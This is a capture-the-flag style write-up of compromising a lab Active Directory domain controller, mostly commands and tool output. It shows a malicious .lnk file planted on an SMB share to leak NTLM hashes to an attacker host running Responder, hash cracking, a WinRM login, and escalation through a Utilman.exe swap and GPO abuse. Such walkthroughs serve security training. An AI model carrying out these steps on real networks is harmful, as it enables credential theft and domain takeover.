##### Tags: `AD`  `kerbrute`  `netexec`  `ntlm_theft`  `SeRestorePrivilege`  `GPO permission abuse`  `responder`

# 🪟 Vault (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.146.172
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 21:08 AEST
Nmap scan report for 192.168.146.172
Host is up (0.11s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-12 11:10:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```
AD with no web service running  
run kerbrute found guest user
```console
$ ./kerbrute userenum --dc 192.168.146.172 -d vault.offsec /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/12/26 - Ronnie Flathers @ropnop

2026/04/12 21:20:59 >  Using KDC(s):
2026/04/12 21:20:59 >   192.168.146.172:88

2026/04/12 21:21:05 >  [+] VALID USERNAME:       guest@vault.offsec
2026/04/12 21:21:18 >  [+] VALID USERNAME:       administrator@vault.offsec
```
netexec found user anirudh
```console
$ netexec smb 192.168.146.172 -u 'guest' -p '' --rid-brute
SMB         192.168.146.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.146.172 445    DC               [+] vault.offsec\guest: 

SMB         192.168.146.172 445    DC               1103: VAULT\anirudh (SidTypeUser)
```
guset can login smb with no password  
there is a DocumentsShare
```console
$ smbclient -L //192.168.146.172 -U 'guest'
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
```
nothing inside but we can upload file
```console
$ smbclient //192.168.146.172/DocumentsShare -U 'guest'
Password for [WORKGROUP\guest]:
smb: \> ls
  .                                   D        0  Fri Nov 19 19:59:02 2021
  ..                                  D        0  Fri Nov 19 19:59:02 2021

                7706623 blocks of size 4096. 714869 blocks available
```
create a NTML theft ink file  
https://github.com/Greenwolf/ntlm_theft
```console
$ python3 ntlm_theft.py -g lnk -s 192.168.45.224 -f vault
Created: vault/vault.lnk (BROWSE TO FOLDER)
Generation Complete.
```
setup listener
```console
$ sudo responder -I tun0
[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...      
```
upload the file to smb
```console
smb: \> put vault.lnk
putting file vault.lnk as \vault.lnk (7.0 kb/s) (average 7.0 kb/s)
smb: \> ls
  .                                   D        0  Sun Apr 12 22:19:59 2026
  ..                                  D        0  Sun Apr 12 22:19:59 2026
  vault.lnk                           A     2164  Sun Apr 12 22:19:59 2026
```
got the hash in responder
```console
[SMB] NTLMv2-SSP Client   : 192.168.146.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:7c89441f114f18b8:7FD24B5EF4313A0101DDFFAFD79DD112:0101000000000000000E1899C9CADC016AE9A1A97F02EFF10000000002000800560055004E004F0001001E00570049004E002D004F00520055005400460030003800360054004100300004003400570049004E002D004F0052005500540046003000380036005400410030002E00560055004E004F002E004C004F00430041004C0003001400560055004E004F002E004C004F00430041004C0005001400560055004E004F002E004C004F00430041004C0007000800000E1899C9CADC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320034000000000000000000
```
crack the hash and got
```console
$ hashcat -m 5600 hash.txt /home/ming/Downloads/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
SecureHM
```
we can login via winrm
```console
$ crackmapexec winrm 192.168.146.172 -u usernames.txt -p SecureHM --continue-on-success

SMB         192.168.146.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
HTTP        192.168.146.172 5985   DC               [*] http://192.168.146.172:5985/wsman
WINRM       192.168.146.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
```
login as anirudh
```console
$ evil-winrm -i 192.168.146.172 -u anirudh -p SecureHM      

*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami
vault\anirudh
```
## Privilege Escalation
there are two ways to get the administrator shell  
SeRestorePrivilege    
GPO permission abuse
```console
*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
## SeRestorePrivilege
```console
*Evil-WinRM* PS C:\Windows\System32>Ren Utilman.exe Utilman.exe.bak
*Evil-WinRM* PS C:\Windows\System32> ren cmd.exe Utilman.exe
login via RDP > press Win key + U 
```
## GPO permission abuse
use bloodhound found we have GenericWrite to Default Domain Policy  
upload SharpGPOAbuse.exe to abuse this function
```console
*Evil-WinRM* PS C:\Users\anirudh\Documents> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```
update the group policy
```console
*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```
anirudh is in administrators group now
```console
*Evil-WinRM* PS C:\Users\anirudh\Documents> net user anirudh
User name                    anirudh
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/19/2021 1:59:51 AM
Password expires             Never
Password changeable          11/20/2021 1:59:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/1/2024 6:10:08 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
